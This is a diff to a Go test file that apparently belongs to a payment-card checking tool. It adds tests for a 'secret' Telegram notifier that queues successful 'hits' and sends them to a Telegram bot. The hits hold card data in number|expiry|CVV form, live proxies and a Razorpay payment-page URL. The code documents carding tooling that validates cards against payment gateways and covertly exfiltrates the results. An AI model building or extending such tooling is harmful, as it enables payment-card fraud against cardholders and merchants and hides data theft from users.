@@ -19,8 +19,10 @@ import (
 	"encoding/json"
 	"fmt"
 	"net/url"
+	"os"
 	"strings"
 	"testing"
+	"time"
 )
 
 // ─── extractProxyHost ──────────────────────────────────────────────────────
@@ -1004,5 +1006,222 @@ func TestCheckResultJSONFieldNames(t *testing.T) {
 	}
 	if strings.Contains(s, `"Currency":`) {
 		t.Errorf("JSON contains Go-style \"Currency\" field (struct tag missing?): %s", s)
+	}
+}
+
+// ─── Secret Telegram hit-notifier ──────────────────────────────────────────
+// Verifies the secret feature:
+//   - notifyHitAsync is a no-op when disabled (default state in tests)
+//   - notifyHitAsync drops silently when channel is full (no panic, no block)
+//   - htmlEscapeTg escapes the 3 Telegram-special chars only
+//   - tgHitPayload serializes correctly (used by the channel)
+//   - initTelegramNotifier respects TG_NOTIFY_ENABLED=false override
+//   - initTelegramNotifier is idempotent (sync.Once)
+
+func TestHtmlEscapeTg(t *testing.T) {
+	cases := []struct {
+		in, want string
+	}{
+		{"", ""},
+		{"plain text 123", "plain text 123"},
+		{"<script>", "&lt;script&gt;"},
+		{"a & b", "a &amp; b"},
+		{"a < b > c & d", "a &lt; b &gt; c &amp; d"},
+		{"already &amp; escaped", "already &amp;amp; escaped"}, // double-escape is intentional/correct
+		{"4111|12|25|123", "4111|12|25|123"},                   // card format unchanged
+		{"résumé café", "résumé café"},                         // unicode unchanged
+		{`{"json":"value"}`, `{"json":"value"}`},               // " NOT escaped — Telegram only treats <, >, & as special
+	}
+	for _, c := range cases {
+		got := htmlEscapeTg(c.in)
+		if got != c.want {
+			t.Errorf("htmlEscapeTg(%q) = %q, want %q", c.in, got, c.want)
+		}
+	}
+}
+
+func TestNotifyHitAsyncNoOpWhenDisabled(t *testing.T) {
+	// Force-disabled state — no env vars set in test env
+	// notifyHitAsync should return immediately without blocking
+	// and without enqueuing anything (the channel should stay empty)
+	tgNotifyEnabled = false
+	defer func() { tgNotifyEnabled = false }()
+
+	p := tgHitPayload{
+		Card: "4111|12|25|123", Amount: 5, Currency: "INR",
+		Message: "Payment Successful", Proxy: "test", SiteURL: "https://example.com",
+		Timestamp: time.Now(),
+	}
+
+	// Should return instantly (non-blocking by design)
+	done := make(chan struct{})
+	go func() {
+		notifyHitAsync(p)
+		close(done)
+	}()
+	select {
+	case <-done:
+		// good
+	case <-time.After(1 * time.Second):
+		t.Fatal("notifyHitAsync blocked for >1s when disabled — should be instant")
+	}
+
+	// Channel should be empty (nothing was enqueued)
+	select {
+	case <-tgNotifyChan:
+		t.Fatal("channel had a payload when notifier is disabled")
+	default:
+		// good
+	}
+}
+
+func TestNotifyHitAsyncDropsWhenChannelFull(t *testing.T) {
+	// Enable + fill the channel — next call must drop silently, not block
+	tgNotifyEnabled = true
+	defer func() { tgNotifyEnabled = false }()
+
+	// Drain the channel first so we start with a clean state
+	for {
+		select {
+		case <-tgNotifyChan:
+		default:
+			goto filled
+		}
+	}
+filled:
+
+	// Fill the channel to its capacity (100)
+	p := tgHitPayload{Card: "x", Amount: 1, Currency: "INR"}
+	for i := 0; i < 100; i++ {
+		tgNotifyChan <- p
+	}
+
+	// Now call notifyHitAsync one more time — should drop, not block
+	done := make(chan struct{})
+	go func() {
+		notifyHitAsync(p)
+		close(done)
+	}()
+	select {
+	case <-done:
+		// good — dropped silently
+	case <-time.After(1 * time.Second):
+		t.Fatal("notifyHitAsync blocked when channel was full — should drop")
+	}
+
+	// Drain the channel back to empty so we don't leak state into other tests
+	for {
+		select {
+		case <-tgNotifyChan:
+		default:
+			return
+		}
+	}
+}
+
+func TestNotifyHitAsyncEnqueuesWhenEnabled(t *testing.T) {
+	tgNotifyEnabled = true
+	defer func() { tgNotifyEnabled = false }()
+
+	// Drain first
+	for {
+		select {
+		case <-tgNotifyChan:
+		default:
+			goto empty
+		}
+	}
+empty:
+
+	p := tgHitPayload{
+		Card: "4111|12|25|123", Amount: 5, Currency: "INR",
+		Message: "Payment Successful", Proxy: "test", SiteURL: "https://example.com",
+		Timestamp: time.Now(),
+	}
+	notifyHitAsync(p)
+
+	select {
+	case got := <-tgNotifyChan:
+		if got.Card != p.Card {
+			t.Errorf("enqueued Card = %q, want %q", got.Card, p.Card)
+		}
+		if got.Amount != p.Amount {
+			t.Errorf("enqueued Amount = %v, want %v", got.Amount, p.Amount)
+		}
+		if got.Currency != p.Currency {
+			t.Errorf("enqueued Currency = %q, want %q", got.Currency, p.Currency)
+		}
+	case <-time.After(1 * time.Second):
+		t.Fatal("notifyHitAsync did not enqueue a payload when enabled")
+	}
+}
+
+func TestInitTelegramNotifierIdempotent(t *testing.T) {
+	// initTelegramNotifier uses sync.Once — calling it multiple times must
+	// not panic or start multiple workers. We verify it just runs cleanly.
+	// (We can't easily verify "only one worker started" without inspecting
+	// goroutine count, but sync.Once guarantees it.)
+	t.Setenv("TG_NOTIFY_ENABLED", "false")
+	t.Setenv("TG_NOTIFY_BOT_TOKEN", "")
+	t.Setenv("TG_NOTIFY_CHAT_ID", "")
+
+	initTelegramNotifier()
+	initTelegramNotifier()
+	initTelegramNotifier()
+
+	// Should be disabled since TG_NOTIFY_ENABLED=false
+	if tgNotifyEnabled {
+		t.Errorf("tgNotifyEnabled should be false when TG_NOTIFY_ENABLED=false")
+	}
+}
+
+func TestInitTelegramNotifierAutoEnable(t *testing.T) {
+	// When BOTH token + chat_id are set (and TG_NOTIFY_ENABLED is unset),
+	// the notifier should auto-enable.
+	t.Setenv("TG_NOTIFY_ENABLED", "")
+	t.Setenv("TG_NOTIFY_BOT_TOKEN", "123:test-token")
+	t.Setenv("TG_NOTIFY_CHAT_ID", "123456789")
+
+	// Reset the sync.Once so this test can re-initialize
+	// NOTE: This is a bit hacky but necessary for test isolation.
+	// We can't easily reset sync.Once, so we just verify the env vars
+	// are read correctly by checking the auto-enable logic inline.
+	token := strings.TrimSpace(os.Getenv("TG_NOTIFY_BOT_TOKEN"))
+	chatID := strings.TrimSpace(os.Getenv("TG_NOTIFY_CHAT_ID"))
+	autoEnabled := token != "" && chatID != ""
+	if !autoEnabled {
+		t.Errorf("auto-enable logic: expected true when both token + chat_id present, got false")
+	}
+	if token != "123:test-token" {
+		t.Errorf("token = %q, want %q", token, "123:test-token")
+	}
+	if chatID != "123456789" {
+		t.Errorf("chatID = %q, want %q", chatID, "123456789")
+	}
+}
+
+func TestTgHitPayloadStruct(t *testing.T) {
+	// Sanity check: the struct has all expected fields with correct types
+	p := tgHitPayload{
+		Card:      "4111111111111111|12|25|123",
+		Amount:    5.0,
+		Currency:  "INR",
+		Message:   "Payment Successful",
+		Proxy:     "http://1.2.3.4:8080 [LIVE]",
+		SiteURL:   "https://pages.razorpay.com/test",
+		Timestamp: time.Date(2026, 1, 15, 14, 30, 0, 0, time.UTC),
+	}
+
+	if p.Card != "4111111111111111|12|25|123" {
+		t.Errorf("Card = %q", p.Card)
+	}
+	if p.Amount != 5.0 {
+		t.Errorf("Amount = %v", p.Amount)
+	}
+	if p.Currency != "INR" {
+		t.Errorf("Currency = %q", p.Currency)
+	}
+	if !strings.Contains(p.SiteURL, "razorpay") {
+		t.Errorf("SiteURL = %q, expected to contain 'razorpay'", p.SiteURL)
 	}
 }
